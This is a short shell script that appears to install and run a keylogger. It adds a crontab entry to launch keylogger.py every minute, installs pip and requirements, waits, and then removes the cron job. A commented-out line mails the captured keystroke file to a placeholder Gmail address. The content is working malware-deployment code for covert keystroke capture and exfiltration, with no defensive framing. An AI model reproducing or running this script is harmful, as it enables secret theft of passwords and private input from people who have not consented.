#!/bin/sh

# add crontab to run the keylogger every minute

crontab -l 2>/dev/null| cat - <(echo "* * * * * python3 $(pwd)/keylogger.py") | crontab -


### install pip ###

curl -O https://bootstrap.pypa.io/get-pip.py
python3 get-pip.py
rm get-pip.py
python3 -m pip install -r requirements.txt


# sleep for 90 seconds, 30 seconds before the second call of the keylogger file
sleep 90

# rm cronjob
crontab -u $USER -l | grep -v '* * * * * python3 keylogger.py'  | crontab -u $USER -

# echo hi.tmp | mailx -s "keylogs $(date)" -r sender_email@gmail.com receiver_email@gmail.com

